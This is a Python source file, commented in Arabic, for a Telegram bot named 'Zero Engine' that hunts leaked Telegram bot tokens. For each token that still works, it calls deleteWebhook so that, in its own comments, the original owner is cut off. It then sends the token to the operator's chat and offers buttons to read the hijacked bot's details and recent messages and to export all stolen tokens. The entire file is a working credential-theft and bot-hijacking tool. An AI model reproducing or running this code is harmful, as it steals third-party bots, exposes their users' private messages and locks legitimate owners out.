import os
import requests
import threading
import time
import telebot
from telebot import types
from scanner import search_for_tokens
from controller import get_bot_info, get_bot_messages

# إعدادات البوت الأساسية
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
FOUND_FILE = "found.txt"
STATS_FILE = "stats.txt" # سيتم إنشاؤه تلقائياً

bot = telebot.TeleBot(BOT_TOKEN)

# --- نظام الترتيب ---
def update_stats(token):
    with open(STATS_FILE, "a") as f:
        f.write(token + "\n")

# --- نظام الكيبورد التفاعلي ---
def get_markup(token):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 معلومات البوت", callback_data=f"info|{token}"))
    markup.add(types.InlineKeyboardButton("📩 آخر الرسائل", callback_data=f"msg|{token}"))
    markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
    return markup

# --- معالجة الأوامر النصية ---
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if str(message.chat.id) != str(CHAT_ID):
        return
    if message.text == "/start":
        bot.reply_to(message, "Zero Engine: البوت يعمل بكامل طاقته. أنتظر صيداً جديداً...")
    elif message.text == "/top":
        if not os.path.exists(STATS_FILE):
            bot.reply_to(message, "⚠️ لا توجد بيانات إحصائية بعد.")
            return
        with open(STATS_FILE, "r") as f:
            data = f.read().splitlines()
        unique = list(set(data))
        sorted_list = sorted([(t, data.count(t)) for t in unique], key=lambda x: x[1], reverse=True)
        markup = types.InlineKeyboardMarkup()
        for token, count in sorted_list[:10]:
            markup.add(types.InlineKeyboardButton(f"بوت {token[:10]} ({count})", callback_data=f"menu|{token}"))
        bot.reply_to(message, "📊 ترتيب البوتات (الأكثر استخداماً):", reply_markup=markup)
    elif message.text == "/get_tokens":
        if os.path.exists(FOUND_FILE) and os.path.getsize(FOUND_FILE) > 0:
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "⚠️ الملف فارغ حالياً.")

# --- معالجة الضغط على الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.message.chat.id) != str(CHAT_ID):
        return
    
    # قائمة التحكم الفرعية
    if call.data.startswith("menu|"):
        token = call.data.split("|")[1]
        bot.edit_message_text(f"⚙️ تحكم في البوت: `{token[:10]}...`", call.message.chat.id, call.message.message_id, reply_markup=get_markup(token), parse_mode="Markdown")
        return
        
    if call.data == "export":
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(CHAT_ID, f)
        return
    try:
        action, token = call.data.split("|")
        update_stats(token) # تحديث الترتيب
        res = get_bot_info(token) if action == "info" else get_bot_messages(token)
        bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"خطأ في معالجة الطلب: {e}")

# --- محرك الصيد مع نظام الاستحواذ والتشخيص ---
def run_scanner():
    print("[*] محرك الصيد بدأ العمل...")
    while True:
        try:
            tokens = search_for_tokens()
            for token in tokens:
                if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                    print(f"[*] جاري فحص التوكن: {token[:10]}...")
                    
                    response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[+] توكن حي تم العثور عليه! جاري الاستحواذ...")
                        
                        # نظام الاستحواذ التقني
                        try:
                            requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook?drop_pending_updates=True", timeout=5)
                            print("[+] تم قطع اتصال المالك الأصلي بنجاح.")
                        except Exception as e:
                            print(f"[!] فشل في الاستحواذ: {e}")
                        
                        bot.send_message(CHAT_ID, f"🔥 تم الاستحواذ بنجاح:\n`{token}`", 
                                         parse_mode="Markdown", reply_markup=get_markup(token))
                        
                        with open(FOUND_FILE, "a") as f:
                            f.write(token + "\n")
                    else:
                        print(f"[-] توكن غير صالح (محذوف أو منتهي): {token[:10]}...")
        except Exception as e:
            print(f"[!] Scanner Loop Error: {e}")
        
        time.sleep(60)

# --- التشغيل الأساسي ---
def run_manual_polling():
    last_update_id = 0
    while True:
        try:
            updates = bot.get_updates(offset=last_update_id + 1, timeout=20)
            for update in updates:
                last_update_id = update.update_id
                bot.process_new_updates([update])
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        bot.delete_webhook()
    except: pass
    
    # تشغيل الماسح في الخلفية
    threading.Thread(target=run_scanner, daemon=True).start()
    
    print("Zero Engine: Online & Stable")
    run_manual_polling()
